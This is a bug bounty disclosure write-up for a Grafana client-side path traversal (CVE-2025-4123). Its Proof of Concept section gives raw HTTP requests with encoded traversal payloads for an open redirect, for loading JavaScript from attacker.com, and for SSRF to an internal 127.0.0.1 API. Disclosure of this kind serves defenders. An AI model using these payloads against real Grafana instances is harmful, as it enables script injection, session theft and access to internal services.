# Title: Client Path Traversal Leading to XSS, Open Redirect and SSRF in Grafana

- **Platform**: Intigriti
- **Program**: Private Program
- **Severity**: High
- **Date**: 2025-06-03
- **Researcher**: Lostsec / A0xtrojan
- **Bounty**: €€ (undisclosed)

## Summary
A client-side path traversal vulnerability was discovered in Grafana (CVE-2025-4123). The frontend failed to properly normalize or sanitize URL paths used for plugin loading and navigation, allowing XSS, open redirect, and SSRF attacks.

## Technical Details
Grafana's frontend URL path handling did not properly normalize encoded path traversal sequences. By injecting `..%2f` or `..%5c` sequences, an attacker could break out of the intended directory and load attacker-controlled resources. This could be used to load malicious JavaScript from external domains (XSS), redirect users to phishing sites (open redirect), or force the frontend to request internal URLs (SSRF).

## Steps to Reproduce
1. Identify a Grafana instance (version < 11.0.1)
2. Inject encoded path traversal sequences into plugin URLs
3. Observe open redirect to attacker-controlled domain
4. For XSS, load malicious JavaScript through a forged plugin configuration
5. For SSRF, access internal services via plugin resource loading

## Proof of Concept
```
# Open Redirect
GET /public/..%2f%5coast.pro%2f%3f%2f..%2f.. HTTP/1.1
Host: grafana.example.com

# XSS via Plugin Loading
GET /public/plugins/..%2f..%2f..%2fattacker.com%2fmalicious.js HTTP/1.1
Host: grafana.example.com

# SSRF via Internal Resource
GET /public/..%2f..%2f..%2f127.0.0.1%3a3000%2fapi%2finternal HTTP/1.1
Host: grafana.example.com
```

## Impact
- Cross-Site Scripting (XSS) - arbitrary JavaScript execution in victim's browser
- Open Redirect - phishing attacks by redirecting to malicious sites
- Client-Side SSRF - accessing internal services and metadata endpoints
- Potential account takeover through session hijacking

## Remediation
Grafana released version 11.0.1 which properly normalizes paths, rejects external domains in plugin loading, and prevents path traversal in frontend routing.

## References
- https://infosecwriteups.com/how-one-path-traversal-in-grafana-unleashed-xss-open-redirect-and-ssrf-cve-2025-4123-b35245dccaab
- https://medium.com/@a0xtrojan/how-i-found-cve-2025-4123-in-grafana-using-fofa-and-got-a-bounty-a21a00d477a8
